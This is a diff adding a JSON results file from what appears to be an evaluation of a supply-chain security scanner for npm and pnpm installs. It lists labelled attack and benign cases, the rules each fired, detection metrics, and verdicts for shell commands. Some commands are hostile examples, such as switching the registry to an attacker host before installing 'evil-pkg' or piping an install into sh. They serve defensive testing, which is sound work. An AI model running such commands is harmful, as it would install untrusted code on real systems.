@@ -1,0 +1,1143 @@
+{
+  "results": [
+    {
+      "id": "a-bundled-dependency-exfil",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 17.034416000000007
+    },
+    {
+      "id": "a-forged-registry-signature",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/signature"],
+      "firedRules": ["install/signature"],
+      "missingRules": [],
+      "durationMs": 1.446957999999995
+    },
+    {
+      "id": "a-hijack-new-publisher",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/publisher"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "install/publisher",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 1.5402500000000003
+    },
+    {
+      "id": "a-install-script-exfil",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.2635830000000112
+    },
+    {
+      "id": "a-new-fresh-dependency",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/new-dependency"],
+      "firedRules": [
+        "install/new-dependency",
+        "install/new-package",
+        "install/recent-release"
+      ],
+      "missingRules": [],
+      "durationMs": 1.8449999999999989
+    },
+    {
+      "id": "a-new-install-script-recent",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/new-install-script"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "install/recent-release",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 1.0307920000000053
+    },
+    {
+      "id": "a-pnpm-install-script-exfil",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 2.714749999999995
+    },
+    {
+      "id": "a-provenance-after-gap",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/provenance"],
+      "firedRules": [
+        "install/install-script",
+        "install/provenance",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 3.7772920000000028
+    },
+    {
+      "id": "a-provenance-other-repo",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/provenance"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "install/provenance",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 2.488291000000004
+    },
+    {
+      "id": "a-replayed-provenance",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/provenance"],
+      "firedRules": ["install/provenance"],
+      "missingRules": [],
+      "durationMs": 2.0697919999999925
+    },
+    {
+      "id": "a-tampered-tarball",
+      "threat": "A",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/integrity"],
+      "firedRules": ["install/integrity", "install/signature"],
+      "missingRules": [],
+      "durationMs": 0.7524999999999977
+    },
+    {
+      "id": "b-typosquat-new-package",
+      "threat": "B",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["install/name"],
+      "firedRules": [
+        "install/name",
+        "install/new-package",
+        "install/recent-release"
+      ],
+      "missingRules": [],
+      "durationMs": 0.5982499999999931
+    },
+    {
+      "id": "benign-binary-installer",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.1355410000000035
+    },
+    {
+      "id": "benign-bundled-dependency",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 2.0680420000000055
+    },
+    {
+      "id": "benign-gitmodules",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.614208000000005
+    },
+    {
+      "id": "benign-handover-same-script",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["install/publisher"],
+      "firedRules": [
+        "install/install-script",
+        "install/publisher",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 0.9907500000000056
+    },
+    {
+      "id": "benign-husky-prepare",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.3580830000000077
+    },
+    {
+      "id": "benign-icon-font-map",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": ["repo/obfuscation"],
+      "missingRules": [],
+      "durationMs": 0.7960419999999999
+    },
+    {
+      "id": "benign-install-member-prisma",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/source", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.42875000000000796
+    },
+    {
+      "id": "benign-install-project-husky",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.22829199999999616
+    },
+    {
+      "id": "benign-installed-project",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/node-modules-present"],
+      "firedRules": ["repo/node-modules-present", "repo/unscanned"],
+      "missingRules": [],
+      "durationMs": 0.42566700000000424
+    },
+    {
+      "id": "benign-large-lockfile",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.23662499999998943
+    },
+    {
+      "id": "benign-long-line-config",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.22666700000000617
+    },
+    {
+      "id": "benign-maintainer-handover",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": ["install/publisher"],
+      "missingRules": [],
+      "durationMs": 0.7405830000000009
+    },
+    {
+      "id": "benign-minified-vendor",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.2753330000000034
+    },
+    {
+      "id": "benign-native-module",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.18958299999999895
+    },
+    {
+      "id": "benign-new-established-dependency",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": ["install/new-dependency"],
+      "missingRules": [],
+      "durationMs": 1.3109999999999928
+    },
+    {
+      "id": "benign-new-install-script-old",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["install/new-install-script"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 2.0227080000000086
+    },
+    {
+      "id": "benign-playwright-install",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.36529099999999914
+    },
+    {
+      "id": "benign-pnpm-approved-build",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.726165999999992
+    },
+    {
+      "id": "benign-pnpm-pnpmfile-pin",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/pnpmfile"],
+      "firedRules": ["repo/pnpmfile"],
+      "missingRules": [],
+      "durationMs": 0.4054169999999999
+    },
+    {
+      "id": "benign-pnpm-unapproved-build",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.2119579999999956
+    },
+    {
+      "id": "benign-popular-package",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.5980840000000001
+    },
+    {
+      "id": "benign-postinstall-copy-env",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.3582499999999982
+    },
+    {
+      "id": "benign-prisma-postinstall",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.4093330000000037
+    },
+    {
+      "id": "benign-provenance-renamed-repo",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["install/new-install-script"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 3.8660409999999956
+    },
+    {
+      "id": "benign-provenance-same-repo",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 2.6767499999999984
+    },
+    {
+      "id": "benign-registry-signed",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.8015409999999861
+    },
+    {
+      "id": "benign-rt-flag-me",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.1487500000000068
+    },
+    {
+      "id": "benign-rtl-locale",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": ["repo/hidden-code"],
+      "missingRules": [],
+      "durationMs": 1.2230000000000132
+    },
+    {
+      "id": "benign-vite-app",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.24587500000001228
+    },
+    {
+      "id": "benign-vscode-build-task",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.5654169999999965
+    },
+    {
+      "id": "benign-vscode-jsonc",
+      "threat": "benign",
+      "expected": "allow",
+      "got": "allow",
+      "outcome": "pass",
+      "expectedRules": [],
+      "firedRules": [],
+      "missingRules": [],
+      "durationMs": 0.22554099999999266
+    },
+    {
+      "id": "benign-vscode-npm-watch",
+      "threat": "benign",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/ide-autorun"],
+      "firedRules": ["repo/ide-autorun"],
+      "missingRules": [],
+      "durationMs": 0.37616700000000947
+    },
+    {
+      "id": "d-binding-gyp-implicit",
+      "threat": "D",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.3299169999999947
+    },
+    {
+      "id": "d-committed-node-modules",
+      "threat": "D",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/node-modules-present"],
+      "firedRules": ["repo/node-modules-present", "repo/unscanned"],
+      "missingRules": [],
+      "durationMs": 0.31091699999998923
+    },
+    {
+      "id": "d-config-obfuscated",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/obfuscation"],
+      "firedRules": ["repo/obfuscation"],
+      "missingRules": [],
+      "durationMs": 0.4677499999999952
+    },
+    {
+      "id": "d-install-member-preinstall",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/source", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.379209000000003
+    },
+    {
+      "id": "d-install-project-postinstall",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.3703749999999957
+    },
+    {
+      "id": "d-known-tool-chained",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.41345799999999144
+    },
+    {
+      "id": "d-obfuscated-string-array",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/obfuscation"],
+      "firedRules": ["repo/obfuscation"],
+      "missingRules": [],
+      "durationMs": 0.3152080000000126
+    },
+    {
+      "id": "d-oversized-config",
+      "threat": "D",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/unscanned"],
+      "firedRules": ["repo/unscanned"],
+      "missingRules": [],
+      "durationMs": 0.22991700000000037
+    },
+    {
+      "id": "d-pnpm-pnpmfile-exfil",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/pnpmfile"],
+      "firedRules": ["repo/pnpmfile"],
+      "missingRules": [],
+      "durationMs": 0.33525000000000205
+    },
+    {
+      "id": "d-postinstall",
+      "threat": "D",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.25337500000000546
+    },
+    {
+      "id": "d-postinstall-curl-pipe",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.18741600000001313
+    },
+    {
+      "id": "d-postinstall-exfil",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.2223340000000178
+    },
+    {
+      "id": "d-postinstall-inline-decode",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 0.20708300000001145
+    },
+    {
+      "id": "d-tailwind-hidden-code",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/hidden-code"],
+      "firedRules": ["repo/hidden-code"],
+      "missingRules": [],
+      "durationMs": 0.2685419999999965
+    },
+    {
+      "id": "d-trojan-source",
+      "threat": "D",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/hidden-code"],
+      "firedRules": ["repo/hidden-code"],
+      "missingRules": [],
+      "durationMs": 0.5199170000000208
+    },
+    {
+      "id": "d-vertical-hidden",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/hidden-code"],
+      "firedRules": ["repo/hidden-code"],
+      "missingRules": [],
+      "durationMs": 0.32499999999998863
+    },
+    {
+      "id": "d-vscode-autorun",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/ide-autorun"],
+      "firedRules": ["repo/ide-autorun"],
+      "missingRules": [],
+      "durationMs": 0.3312080000000037
+    },
+    {
+      "id": "d-vscode-hidden-nested",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/ide-autorun"],
+      "firedRules": ["repo/ide-autorun"],
+      "missingRules": [],
+      "durationMs": 1.1878340000000094
+    },
+    {
+      "id": "d-vscode-npm-autorun",
+      "threat": "D",
+      "expected": "block",
+      "got": "block",
+      "outcome": "pass",
+      "expectedRules": ["repo/ide-autorun"],
+      "firedRules": ["repo/ide-autorun"],
+      "missingRules": [],
+      "durationMs": 0.31783300000000736
+    },
+    {
+      "id": "rt-dormant-payload",
+      "threat": "A",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["install/new-install-script"],
+      "firedRules": [
+        "install/install-script",
+        "install/new-install-script",
+        "repo/lifecycle-script"
+      ],
+      "missingRules": [],
+      "durationMs": 1.4867089999999905
+    },
+    {
+      "id": "rt-fake-answer",
+      "threat": "A",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.0674999999999955
+    },
+    {
+      "id": "rt-fake-boundary",
+      "threat": "A",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.2360000000000184
+    },
+    {
+      "id": "rt-injection-comment",
+      "threat": "A",
+      "expected": "warn",
+      "got": "warn",
+      "outcome": "pass",
+      "expectedRules": ["repo/lifecycle-script"],
+      "firedRules": ["install/install-script", "repo/lifecycle-script"],
+      "missingRules": [],
+      "durationMs": 1.850042000000002
+    }
+  ],
+  "metrics": {
+    "cases": 67,
+    "malicious": 35,
+    "benign": 32,
+    "blockRecall": {
+      "hit": 26,
+      "total": 35
+    },
+    "flagRecall": {
+      "hit": 35,
+      "total": 35
+    },
+    "falseAlarms": {
+      "hit": 0,
+      "total": 32
+    },
+    "ruleRecall": {
+      "hit": 52,
+      "total": 52
+    }
+  },
+  "durationMs": 78.68829199999999,
+  "commands": {
+    "results": [
+      {
+        "command": "npm install axios",
+        "expect": "check",
+        "why": "the most common agent install",
+        "got": "check"
+      },
+      {
+        "command": "npm i -D @types/node typescript",
+        "expect": "check",
+        "why": "dev dependencies install the same way",
+        "got": "check"
+      },
+      {
+        "command": "cd frontend && npm install",
+        "expect": "check",
+        "why": "a nested install (D20)",
+        "got": "check"
+      },
+      {
+        "command": "npx create-next-app@latest my-app",
+        "expect": "check",
+        "why": "npx downloads and runs at once",
+        "got": "check"
+      },
+      {
+        "command": "npm create vite@latest web -- --template react-ts",
+        "expect": "check",
+        "why": "npm create runs create-vite",
+        "got": "check"
+      },
+      {
+        "command": "npm ci",
+        "expect": "check",
+        "why": "reinstalls every locked package",
+        "got": "check"
+      },
+      {
+        "command": "npx -y @modelcontextprotocol/server-filesystem /tmp",
+        "expect": "check",
+        "why": "agents start MCP servers with npx",
+        "got": "check"
+      },
+      {
+        "command": "sudo npm install -g pnpm",
+        "expect": "check",
+        "why": "global installs run scripts too",
+        "got": "check"
+      },
+      {
+        "command": "bash -c \"npm install express\"",
+        "expect": "check",
+        "why": "an install inside sh -c",
+        "got": "check"
+      },
+      {
+        "command": "npm --prefix server install",
+        "expect": "check",
+        "why": "--prefix moves the install",
+        "got": "check"
+      },
+      {
+        "command": "npm exec --yes prettier -- --write .",
+        "expect": "check",
+        "why": "npm exec downloads a missing package",
+        "got": "check"
+      },
+      {
+        "command": "npm update",
+        "expect": "check",
+        "why": "updates bring in new versions",
+        "got": "check"
+      },
+      {
+        "command": "npm install $(cat deps.txt)",
+        "expect": "deny",
+        "why": "packages only known at run time",
+        "got": "deny"
+      },
+      {
+        "command": "pnpm add zod",
+        "expect": "check",
+        "why": "pnpm is checked since M6",
+        "got": "check"
+      },
+      {
+        "command": "yarn add react",
+        "expect": "deny",
+        "why": "yarn is not checked yet (M6)",
+        "got": "deny"
+      },
+      {
+        "command": "npm i --registry https://npm.internal.invalid pkg",
+        "expect": "deny",
+        "why": "a registry croak does not check",
+        "got": "deny"
+      },
+      {
+        "command": "cd \"$WORKDIR\" && npm install",
+        "expect": "deny",
+        "why": "a directory only known at run time",
+        "got": "deny"
+      },
+      {
+        "command": "eval \"$INSTALL_CMD\"",
+        "expect": "deny",
+        "why": "eval of a variable could be an install",
+        "knownGap": true,
+        "got": "ignore"
+      },
+      {
+        "command": "npm test",
+        "expect": "ignore",
+        "why": "runs project scripts, installs nothing",
+        "got": "ignore"
+      },
+      {
+        "command": "npm run build",
+        "expect": "ignore",
+        "why": "runs project scripts, installs nothing",
+        "got": "ignore"
+      },
+      {
+        "command": "npm run lint -- --fix",
+        "expect": "ignore",
+        "why": "runs project scripts, installs nothing",
+        "got": "ignore"
+      },
+      {
+        "command": "npx tsc --noEmit",
+        "expect": "ignore",
+        "why": "a bin the project already has",
+        "got": "ignore"
+      },
+      {
+        "command": "git commit -m \"fix: npm install step\"",
+        "expect": "ignore",
+        "why": "npm install is only text in a message",
+        "got": "ignore"
+      },
+      {
+        "command": "echo \"run npm install first\"",
+        "expect": "ignore",
+        "why": "npm install is only text",
+        "got": "ignore"
+      },
+      {
+        "command": "grep -rn \"npm i\" docs/",
+        "expect": "ignore",
+        "why": "npm i is only a search pattern",
+        "got": "ignore"
+      },
+      {
+        "command": "npm ls --depth=0",
+        "expect": "ignore",
+        "why": "reads the tree",
+        "got": "ignore"
+      },
+      {
+        "command": "npm view react version",
+        "expect": "ignore",
+        "why": "reads registry metadata",
+        "got": "ignore"
+      },
+      {
+        "command": "npm outdated",
+        "expect": "ignore",
+        "why": "reads registry metadata",
+        "got": "ignore"
+      },
+      {
+        "command": "npm init -y",
+        "expect": "ignore",
+        "why": "writes package.json, installs nothing",
+        "got": "ignore"
+      },
+      {
+        "command": "node -e \"console.log(process.version)\"",
+        "expect": "ignore",
+        "why": "not a package manager",
+        "got": "ignore"
+      },
+      {
+        "command": "if [ -f package.json ]; then npm install evil-pkg; fi",
+        "expect": "check",
+        "why": "an install inside if/then (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "timeout 300 npm install evil-pkg",
+        "expect": "check",
+        "why": "a wrapper with a value (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "bash -lc 'npm install evil-pkg'",
+        "expect": "check",
+        "why": "combined shell flags (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "version=$(npm i evil-pkg)",
+        "expect": "check",
+        "why": "an install inside $(…) (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "npm -C /repo/server install evil-pkg",
+        "expect": "check",
+        "why": "-C is --prefix (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "npm upd",
+        "expect": "check",
+        "why": "npm accepts unique prefixes (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "cd src && npm install",
+        "expect": "check",
+        "why": "npm installs into the project root, not src/ (M4 review)",
+        "got": "check"
+      },
+      {
+        "command": "echo 'npm install evil-pkg' | sh",
+        "expect": "deny",
+        "why": "a script piped into a shell (M4 review)",
+        "got": "deny"
+      },
+      {
+        "command": "ls packages | xargs npm install",
+        "expect": "deny",
+        "why": "arguments croak cannot follow (M4 review)",
+        "got": "deny"
+      },
+      {
+        "command": "npm config set registry https://attacker.invalid/ && npm i evil-pkg",
+        "expect": "deny",
+        "why": "registry changed before installing (M4 review)",
+        "got": "deny"
+      },
+      {
+        "command": "npm audit fix",
+        "expect": "deny",
+        "why": "not checked yet (M4 review)",
+        "got": "deny"
+      },
+      {
+        "command": "cat > NOTES.md <<'EOF'\nRun npm install first.\nEOF",
+        "expect": "ignore",
+        "why": "a heredoc body is data",
+        "got": "ignore"
+      },
+      {
+        "command": "bash scripts/build.sh && npm test",
+        "expect": "ignore",
+        "why": "a script file, not an install",
+        "got": "ignore"
+      },
+      {
+        "command": "pnpm dlx create-vite@latest app",
+        "expect": "check",
+        "why": "pnpm dlx downloads and runs at once (M6)",
+        "got": "check"
+      },
+      {
+        "command": "cd packages/web && pnpm install",
+        "expect": "check",
+        "why": "a pnpm workspace member, checked at the root (M6)",
+        "got": "check"
+      },
+      {
+        "command": "pnpm install --frozen-lockfile",
+        "expect": "check",
+        "why": "installs the lockfile as written (M6)",
+        "got": "check"
+      },
+      {
+        "command": "pnpm --registry https://npm.internal.invalid add x",
+        "expect": "deny",
+        "why": "a registry croak does not check (M6)",
+        "got": "deny"
+      },
+      {
+        "command": "pnpm exec tsc --noEmit",
+        "expect": "ignore",
+        "why": "runs a local bin, installs nothing (M6)",
+        "got": "ignore"
+      },
+      {
+        "command": "pnpm run test",
+        "expect": "ignore",
+        "why": "runs project scripts, installs nothing (M6)",
+        "got": "ignore"
+      },
+      {
+        "command": "pnpm install --dangerously-allow-all-builds",
+        "expect": "deny",
+        "why": "a flag that lets every build run (M6 review)",
+        "got": "deny"
+      },
+      {
+        "command": "pnpm add --allow-build=evil evil",
+        "expect": "deny",
+        "why": "a flag that allows one package's build (M6 review)",
+        "got": "deny"
+      },
+      {
+        "command": "pnpm with 9.15.4 install",
+        "expect": "deny",
+        "why": "runs another pnpm version (M6 review)",
+        "got": "deny"
+      },
+      {
+        "command": "pnpm ci",
+        "expect": "check",
+        "why": "installs the lockfile as written (M6 review)",
+        "got": "check"
+      }
+    ],
+    "metrics": {
+      "caught": {
+        "hit": 36,
+        "total": 37
+      },
+      "untouched": {
+        "hit": 16,
+        "total": 16
+      },
+      "exact": {
+        "hit": 52,
+        "total": 53
+      }
+    }
+  }
+}
